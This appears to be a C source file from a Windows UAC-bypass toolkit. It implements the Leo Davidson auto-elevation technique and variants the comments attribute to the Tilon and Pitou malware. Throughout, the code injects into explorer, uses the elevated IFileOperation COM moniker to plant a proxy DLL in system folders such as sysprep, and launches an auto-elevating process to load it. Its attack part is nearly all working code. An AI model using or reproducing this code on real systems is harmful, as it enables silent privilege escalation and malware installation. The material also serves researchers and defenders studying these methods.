/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       PITOU.C
*
*  VERSION:     2.00
*
*  DATE:        16 Nov 2015
*
*  Leo Davidson work based AutoElevation and Pitou new variant.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include <shlobj.h>

ELOAD_PARAMETERS g_ElevParams;
ELOAD_PARAMETERS_3 g_ElevParams3;

/*
* ucmElevatedLoadProc
*
* Purpose:
*
* Bypass UAC using AutoElevated IFileOperation.
* Refactored Leo Davidson concept.
*
*/
DWORD WINAPI ucmElevatedLoadProc(
	PELOAD_PARAMETERS elvpar
	)
{
	HRESULT				r;
	BOOL				cond = FALSE;
	IFileOperation      *FileOperation1 = NULL;
	IShellItem			*isrc = NULL, *idst = NULL;
	BIND_OPTS3			bop;
	SHELLEXECUTEINFOW   shexec;
	WCHAR				textbuf[MAX_PATH * 2], *p, *f, *f0;

	if (elvpar == NULL)
		return (DWORD)E_FAIL;

	r = elvpar->xCoInitialize(NULL);
	if (r != S_OK)
		return r;

	RtlSecureZeroMemory(&bop, sizeof(bop));
	RtlSecureZeroMemory(&shexec, sizeof(shexec));

	do {
		r = elvpar->xCoCreateInstance(&elvpar->xCLSID, NULL,
			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &elvpar->xIID, &FileOperation1);

		if (r != S_OK) {
			break;
		}

		if (FileOperation1 != NULL) {
			FileOperation1->lpVtbl->Release(FileOperation1);
		}

		bop.cbStruct = sizeof(bop);
		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
		r = elvpar->xCoGetObject(elvpar->EleMoniker, (BIND_OPTS *)&bop, &elvpar->xIID, &FileOperation1);
		if (r != S_OK) {
			break;
		}
		if (FileOperation1 == NULL) {
			r = E_FAIL;
			break;
		}

		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
			FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);

		r = elvpar->xSHCreateItemFromParsingName(elvpar->SourceFilePathAndName,
			NULL, &elvpar->xIID_IShellItem, &isrc);

		if (r != S_OK) {
			break;
		}
		r = elvpar->xSHCreateItemFromParsingName(elvpar->DestinationDir, NULL, &elvpar->xIID_IShellItem, &idst);
		if (r != S_OK) {
			break;
		}

		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
		if (r != S_OK) {
			break;
		}
		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
		if (r != S_OK) {
			break;
		}

		idst->lpVtbl->Release(idst);
		idst = NULL;
		isrc->lpVtbl->Release(isrc);
		isrc = NULL;

		shexec.cbSize = sizeof(shexec);
		shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
		shexec.nShow = SW_SHOW;
		shexec.lpFile = elvpar->ExePathAndName;
		shexec.lpParameters = NULL;
		shexec.lpDirectory = elvpar->DestinationDir;
		if (elvpar->xShellExecuteExW(&shexec))
			if (shexec.hProcess != NULL) {
				elvpar->xWaitForSingleObject(shexec.hProcess, INFINITE);
				elvpar->xCloseHandle(shexec.hProcess);
			}

		f0 = textbuf;
		p = (WCHAR *)elvpar->DestinationDir;
		while (*p != (WCHAR)0) {
			*f0 = *p;
			f0++;
			p++;
		}
		*f0 = 0;

		f = (WCHAR *)elvpar->SourceFilePathAndName;
		p = f;
		while (*f != (WCHAR)0) {
			if (*f == (WCHAR)'\\')
				p = (WCHAR *)f + 1;
			f++;
		}

		while (*p != (WCHAR)0) {
			*f0 = *p;
			f0++;
			p++;
		}
		*f0 = 0;

		r = elvpar->xSHCreateItemFromParsingName(textbuf, NULL, &elvpar->xIID_IShellItem, &idst);
		if (r != S_OK) {
			break;
		}

		r = FileOperation1->lpVtbl->DeleteItem(FileOperation1, idst, NULL);
		if (r != S_OK) {
			break;
		}
		FileOperation1->lpVtbl->PerformOperations(FileOperation1);

	} while (cond);

	if (FileOperation1 != NULL) {
		FileOperation1->lpVtbl->Release(FileOperation1);
	}
	if (isrc != NULL) {
		isrc->lpVtbl->Release(isrc);
	}
	if (idst != NULL) {
		idst->lpVtbl->Release(idst);
	}

	elvpar->xCoUninitialize();
	return r;
}

/*
* ucmCreateCallParameters
*
* Purpose:
*
* Fill common part of call parameters.
*
*/
BOOL ucmCreateCallParameters(
	PVOID Parameters
	)
{
	BOOL bCond = FALSE, bResult = FALSE;
	PELOAD_PARAMETERS elvpar = (PELOAD_PARAMETERS)Parameters;
	
	do {

		if (Parameters == NULL) {
			break;
		}

		//elevation moniker
		_strcpy_w(elvpar->EleMoniker, IFILEOP_ELEMONIKER);

		elvpar->xIID = IID_IFileOperation;
		elvpar->xIID_IShellItem = IID_IShellItem;
		elvpar->xCLSID = CLSID_FileOperation;

		elvpar->xCoInitialize = (pfnCoInitialize)GetProcAddress(g_ctx.hOle32, "CoInitialize");
		elvpar->xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(g_ctx.hOle32, "CoCreateInstance");
		elvpar->xCoGetObject = (pfnCoGetObject)GetProcAddress(g_ctx.hOle32, "CoGetObject");
		elvpar->xCoUninitialize = (pfnCoUninitialize)GetProcAddress(g_ctx.hOle32, "CoUninitialize");
		elvpar->xSHCreateItemFromParsingName = (pfnSHCreateItemFromParsingName)GetProcAddress(g_ctx.hShell32, "SHCreateItemFromParsingName");
		elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
		elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ctx.hKernel32, "WaitForSingleObject");
		elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ctx.hKernel32, "CloseHandle");
		elvpar->xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(g_ctx.hKernel32, "OutputDebugStringW");

		bResult = TRUE;

	} while (bCond);

	return bResult;
}

/*
* ucmStandardAutoElevation
*
* Purpose:
*
* Leo Davidson AutoElevation method with derivatives.
*
* M1W7   - Original Leo Davidson concept.
* M1W8   - Windows 8.1 adapted M1W7 (bypassing sysprep embedded manifest dlls redirection).
* M1W7T  - Leo Davidson concept with different target dll, used by Win32/Tilon.
* M1W10  - Windows 10 adapted M1W7.
* M1WALL - WinNT/Pitou derivative from Leo Davidson concept.
*
*/
BOOL ucmStandardAutoElevation(
	UACBYPASSMETHOD Method,
	CONST PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL		cond = FALSE, bResult = FALSE;
	LPWSTR		lpSourceDll, lpTargetDir, lpTargetProcess;
	WCHAR		szBuffer[MAX_PATH + 1];

	switch (Method) {

	case UacMethodSysprep1:
		lpSourceDll = M1W7_SOURCEDLL;
		lpTargetDir = M1W7_TARGETDIR;
		lpTargetProcess = M1W7_TARGETPROCESS;
		break;

	case UacMethodSysprep2:
		lpSourceDll = M1W8_SOURCEDLL;
		lpTargetDir = M1W7_TARGETDIR;
		lpTargetProcess = M1W7_TARGETPROCESS;
		break;

	case UacMethodSysprep3:
		lpSourceDll = M1W10_SOURCEDLL;
		lpTargetDir = M1W7_TARGETDIR;
		lpTargetProcess = M1W7_TARGETPROCESS;
		break;

	case UacMethodOobe:
		lpSourceDll = M1WALL_SOURCEDLL;
		lpTargetDir = M1WALL_TARGETDIR;
		lpTargetProcess = M1WALL_TARGETPROCESS;
		break;

	case UacMethodTilon:
		lpSourceDll = M1W7T_SOURCEDLL;
		lpTargetDir = M1W7_TARGETDIR;
		lpTargetProcess = M1W7_TARGETPROCESS;
		break;

	default:
		return FALSE;
	}

	do {

		//setup call parameters
		RtlSecureZeroMemory(&g_ElevParams, sizeof(g_ElevParams));
		if (!ucmCreateCallParameters(&g_ElevParams)) {
			break;
		}

		//source filename
		if (ExpandEnvironmentStringsW(lpSourceDll,
			g_ElevParams.SourceFilePathAndName, MAX_PATH) == 0)
		{
			break;
		}

		if (!supWriteBufferToFile(g_ElevParams.SourceFilePathAndName, 
			ProxyDll, ProxyDllSize))
		{
			break;
		}

		//dest directory
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(szBuffer, lpTargetDir);
		
		if (ExpandEnvironmentStringsW(szBuffer, 
			g_ElevParams.DestinationDir, MAX_PATH) == 0) 
		{
			break;
		}
		
		//target
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(szBuffer, lpTargetProcess);
		
		if (ExpandEnvironmentStringsW(szBuffer, 
			g_ElevParams.ExePathAndName, MAX_PATH) == 0) 
		{
			break;
		}

		bResult = ucmInjectExplorer(&g_ElevParams, ucmElevatedLoadProc);

	} while (cond);

	return bResult;
}

/*
* ucmElevatedLoadProcEx
*
* Purpose:
*
* Bypass UAC using AutoElevated IFileOperation.
* Special version.
*
*/
DWORD WINAPI ucmElevatedLoadProcEx(
	PELOAD_PARAMETERS_3 elvpar
	)
{
	HRESULT				r;
	BOOL				cond = FALSE;
	IFileOperation      *FileOperation1 = NULL;
	IShellItem			*isrc = NULL, *idst = NULL;
	BIND_OPTS3			bop;
	SHELLEXECUTEINFOW   shexec;

	if (elvpar == NULL)
		return (DWORD)E_FAIL;

	r = elvpar->xCoInitialize(NULL);
	if (r != S_OK)
		return r;

	RtlSecureZeroMemory(&bop, sizeof(bop));
	RtlSecureZeroMemory(&shexec, sizeof(shexec));

	do {
		r = elvpar->xCoCreateInstance(&elvpar->xCLSID, NULL,
			CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &elvpar->xIID, &FileOperation1);

		if (r != S_OK) {
			break;
		}

		if (FileOperation1 != NULL) {
			FileOperation1->lpVtbl->Release(FileOperation1);
		}

		bop.cbStruct = sizeof(bop);
		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
		r = elvpar->xCoGetObject(elvpar->EleMoniker, (BIND_OPTS *)&bop, &elvpar->xIID, &FileOperation1);
		if (r != S_OK) {
			break;
		}
		if (FileOperation1 == NULL) {
			r = E_FAIL;
			break;
		}

		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
			FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);

		r = elvpar->xSHCreateItemFromParsingName(elvpar->SourceFilePathAndName,
			NULL, &elvpar->xIID_IShellItem, &isrc);

		if (r != S_OK) {
			break;
		}
		r = elvpar->xSHCreateItemFromParsingName(elvpar->DestinationDir, NULL, &elvpar->xIID_IShellItem, &idst);
		if (r != S_OK) {
			break;
		}

		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
		if (r != S_OK) {
			break;
		}
		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
		if (r != S_OK) {
			break;
		}

		idst->lpVtbl->Release(idst);
		idst = NULL;
		isrc->lpVtbl->Release(isrc);
		isrc = NULL;

	} while (cond);

	if (FileOperation1 != NULL) {
		FileOperation1->lpVtbl->Release(FileOperation1);
	}
	if (isrc != NULL) {
		isrc->lpVtbl->Release(isrc);
	}
	if (idst != NULL) {
		idst->lpVtbl->Release(idst);
	}

	elvpar->xCoUninitialize();
	return r;
}

/*
* ucmAutoElevateCopyFile
*
* Purpose:
*
* Copy file autoelevated.
*
*/
BOOL ucmAutoElevateCopyFile(
	LPWSTR SourceFileName,
	LPWSTR DestinationDir
	)
{
	BOOL		cond = FALSE, bResult = FALSE;
	WCHAR		szBuffer[MAX_PATH + 1];

	do {
		if (
			(SourceFileName == NULL) ||
			(DestinationDir == NULL)
			)
		{
			break;
		}

		RtlSecureZeroMemory(&g_ElevParams3, sizeof(g_ElevParams3));

		//setup call parameters
		if (!ucmCreateCallParameters(&g_ElevParams3)) {
			break;
		}

		//dest directory
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(g_ElevParams3.DestinationDir, DestinationDir);
		_strcpy_w(g_ElevParams3.SourceFilePathAndName, SourceFileName);
		bResult = ucmInjectExplorer(&g_ElevParams3, ucmElevatedLoadProcEx);

	} while (cond);

	return bResult;
}
